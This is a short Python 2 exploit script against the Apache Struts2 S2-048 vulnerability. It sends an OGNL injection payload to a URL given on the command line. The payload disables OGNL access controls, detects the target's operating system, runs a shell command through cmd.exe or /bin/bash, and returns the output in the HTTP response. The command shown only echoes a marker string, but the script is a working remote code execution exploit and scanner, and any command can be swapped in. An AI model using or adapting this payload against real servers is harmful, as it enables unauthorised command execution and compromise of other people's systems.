#!/usr/bin/env python
# -*- coding:utf-8 -*-
# code：mr.tcsy 

'''s2-048 exp'''

import requests
import sys
from  requests import exceptions

#此处为本地tomcat环境测试启用
#import httplib
#httplib.HTTPConnection._http_vsn = 10 
#httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0' 

def main():
	url = sys.argv[1]
	data = {'name':"${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='echo hello hacker').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", 'age':'bbb', '__checkbox_bustedBefore':'true', 'description':'ccc'}
	try:
		response = requests.post(url, data,timeout=0.5) 
		#print response.headers
		#print response.text
	except exceptions.Timeout as e:
		print '请检查域名'
	else:
		poc = response.text
		if 'hacker' in poc:
			print "URL:"+ url + '',"yes"
		else:
			print "URL:"+ url + '',"no"
			
if __name__ == '__main__':
        main()
